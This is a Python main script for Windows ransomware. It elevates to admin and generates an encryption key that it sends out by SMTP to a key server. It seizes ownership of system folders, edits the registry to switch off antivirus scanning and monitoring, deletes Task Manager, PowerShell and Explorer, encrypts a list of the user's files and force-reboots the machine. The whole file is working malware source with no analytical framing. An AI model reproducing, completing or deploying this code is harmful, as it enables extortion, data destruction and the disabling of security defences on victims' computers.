#!/usr/bin/python
#coding:utf-8
from tkinter import *
from timeit import default_timer
import tkinter as tk
from cryptography.fernet import Fernet
from modules.crypt import crypt
from modules.permission import takeown, icacls, get_admin_rights
from modules.system import killproc, delproc, regedit, cpysrc, service
from modules.network import host_connect, sendkey_smtp, keyserver
import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
if(get_admin_rights.is_admin()):
    if host_connect.keyrcv():
        keyserver.getcrypt()
    else:
        crypt.genkey(usr)
        sendkey_smtp.send_key()
        takeown.process()
        takeown.exp()
        takeown.perf()
        takeown.perfall()
        takeown.sysDir()
        icacls.perf()
        icacls.perfall()
        icacls.sysDir()
        cpysrc.cp_guitmp()
        regedit.delInit()
        regedit.setInit()
        regedit.noRun()
        regedit.spy()
        regedit.scanRtime()
        regedit.bMonitor()
        regedit.onAccess()
        icacls.exp()
        icacls.pshll()
        icacls.sys32()
        delproc.tskmgr()
        killproc.smart()
        delproc.smart()
        delproc.pwsst()
        crypt.filelist()
        cpysrc.cp_cmd()
        cpysrc.cp_gui()
        regedit.delcmd()
        regedit.setCmd()
        killproc.exp()
        delproc.exp()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
# REBOOT WINDOWS
os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
